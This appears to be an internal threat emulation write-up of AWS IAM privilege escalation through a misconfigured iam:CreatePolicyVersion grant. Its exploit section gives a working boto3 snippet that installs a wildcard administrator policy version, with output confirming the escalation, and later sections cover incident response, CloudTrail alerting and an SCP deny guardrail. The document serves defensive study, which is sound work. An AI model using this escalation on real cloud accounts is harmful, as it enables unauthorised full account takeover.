# Threat Emulation Scenario 02: IAM Privilege Escalation via Policy Versioning

## 1. Overview & Threat Context
* **Threat Category:** Identity & Access Management (IAM) Misconfiguration / Privilege Escalation
* **MITRE ATT&CK Mapping:** 
  * [T1078.004 - Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/)
  * [T1098 - Account Manipulation](https://attack.mitre.org/techniques/T1098/)
  * [T1548 - Abuse Elevation Control Mechanism](https://attack.mitre.org/techniques/T1548/)
* **Target Identity:** Low-privilege developer account (`developer-a`).

In cloud architectures, adversaries who obtain initial entry via compromised developer credentials routinely seek paths to elevate privileges. AWS IAM policy versioning allows customer-managed policies to maintain up to five distinct historical revisions. If an identity possesses rights to create new versions and declare them as default, full account compromise is achievable without requiring administrative role assumption.

---

## 2. Root Cause Analysis (Vulnerability Breakdown)

The vulnerability existed within a customer-managed policy named `Vulnerable-Dev-Policy`. While the policy primarily provided read-only telemetry permissions, it contained a dangerous capability allowing version creation on its own resource ARN:

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "ReadOnlyBaseline",
            "Effect": "Allow",
            "Action": [
                "s3:ListAllMyBuckets",
                "iam:ListPolicies",
                "iam:GetPolicy",
                "iam:GetPolicyVersion"
            ],
            "Resource": "*"
        },
        {
            "Sid": "OverlyPermissiveVersionManagement",
            "Effect": "Allow",
            "Action": [
                "iam:CreatePolicyVersion"
            ],
            "Resource": "arn:aws:iam::<ACCOUNT_ID>:policy/Vulnerable-Dev-Policy"
        }
    ]
}
```

### Why This is Critical:
`iam:CreatePolicyVersion` allows the caller to submit an entirely new JSON policy document. By supplying an administrative payload (`"Action": "*"`, `"Resource": "*"`) alongside the `--set-as-default` flag, the calling identity dynamically rewrites its own effective permissions.

---

## 3. Exploit Execution Workflow

An automated Python script (`scripts/exploit.py`) utilizing `boto3` was deployed to emulate an attacker abusing compromised developer access keys:

### Step 1: Pre-Exploitation Baseline Check
The compromised identity attempted to list all account users:
```bash
python scripts/exploit.py
```

**Output:**
```text
[*] Step 1: Probing initial permissions (Testing 'iam:ListUsers')...
[-] Access Blocked as Expected: An error occurred (AccessDenied) when calling the ListUsers operation: 
    User: arn:aws:iam::<ACCOUNT_ID>:user/developer-a is not authorized to perform: iam:ListUsers.
[+] Verified: Developer operates under restrictive baseline.
```

### Step 2: Malicious Version Injection
The script constructed an unrestricted administrator payload and invoked the target API:
```python
payload = {
    "Version": "2012-10-17",
    "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*"}]
}

iam_client.create_policy_version(
    PolicyArn="arn:aws:iam::<ACCOUNT_ID>:policy/Vulnerable-Dev-Policy",
    PolicyDocument=json.dumps(payload),
    SetAsDefault=True
)
```

**Output:**
```text
[+] EXPLOIT SUCCESS: Created and activated default policy version [v3].
[+] Target policy has been overwritten with global administrative permissions.
```

### Step 3: Technical Observation — Distributed Propagation Delay
* **Phenomenon:** Immediately after calling `CreatePolicyVersion`, sub-millisecond execution of `ListUsers` produced an initial `AccessDenied`.
* **Root Cause (Eventual Consistency):** AWS IAM is a globally distributed system. Permission changes take hundreds of milliseconds to propagate across regional evaluation caches. Upon re-invoking the check after token propagation, elevation was confirmed:

```text
[+] ELEVATION VERIFIED: Successfully accessed restricted administrative API!
[+] Current IAM Identities retrieved from target account:
    -> Identity: cloud-sec-admin | Created: 2026-06-12 15:38:45+00:00
    -> Identity: developer-a     | Created: 2026-06-15 15:35:35+00:00
```

---

## 4. Incident Response & Threat Eradication

Operating under the Security Response protocol, the privilege escalation vector was eradicated through the following steps:

1. **Policy Reversion:** Re-assigned baseline version `v1` as the active default policy version.
2. **Backdoor Eradication:** Permanently deleted malicious versions `v2` and `v3` from the policy version history.
3. **Credential Invalidation:** Immediately deactivated and deleted the compromised Access Key pair (`AKIAIOSFODNN7EXAMPLE`) associated with `developer-a`.
4. **Policy Hardening:** Removed `iam:CreatePolicyVersion` from the policy definition, restricting policy maintenance exclusively to automated CI/CD roles.

---

## 5. Defensive Detections & Engineering Controls

1. **Detection Engineering via Metric Filters:** Deployed real-time alerts monitoring CloudTrail logs for `CreatePolicyVersion`, `AttachUserPolicy`, and `PutUserPolicy` invocations.
2. **Service Control Policy (SCP) Guardrails:** Enforce organizational guardrails denying IAM policy editing permissions to non-security roles:
   ```json
   {
       "Effect": "Deny",
       "Action": [
           "iam:CreatePolicyVersion",
           "iam:SetDefaultPolicyVersion",
           "iam:AttachUserPolicy"
       ],
       "Resource": "*",
       "Condition": {
           "StringNotLike": {
               "aws:PrincipalArn": "arn:aws:iam::<ACCOUNT_ID>:role/SecurityAdminRole"
           }
       }
   }
   ```
3. **Automated Static & Dynamic Auditing:** Integrated scheduled scans with `scripts/cloud_security_auditor.py` to flag high-risk privilege escalation primitives automatically.
